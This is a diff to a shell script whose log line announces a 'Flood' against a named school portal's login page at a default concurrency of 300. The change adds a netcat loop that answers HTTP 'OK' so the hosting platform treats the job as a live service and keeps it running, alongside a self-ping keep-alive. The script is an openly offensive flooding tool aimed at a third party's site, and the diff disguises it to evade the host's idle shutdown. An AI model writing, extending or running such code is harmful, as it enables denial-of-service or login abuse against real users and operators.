@@ -2,8 +2,18 @@
 TARGET="https://eportal.mabest-academy.com/login.php"
 BODY="/app/login.txt"
 C="${CONCURRENCY:-300}"
-SELF_URL="${RENDER_EXTERNAL_URL:-http://localhost:10000}"
+PORT="${PORT:-10000}"
 
+# Simple HTTP server that responds with "OK" to keep service alive
+( while true; do
+    echo -e "HTTP/1.1 200 OK\nContent-Length: 2\n\nOK" | nc -l -p $PORT;
+done ) &
+
+# Wait a moment for the server to start
+sleep 1
+
+# Update SELF_URL to use the port
+SELF_URL="http://localhost:$PORT"
 echo "[$(date)] Flood starting. C=$C Self=$SELF_URL"
 
 # Keep-alive: ping our own public URL every 5 min so Render doesn't sleep us
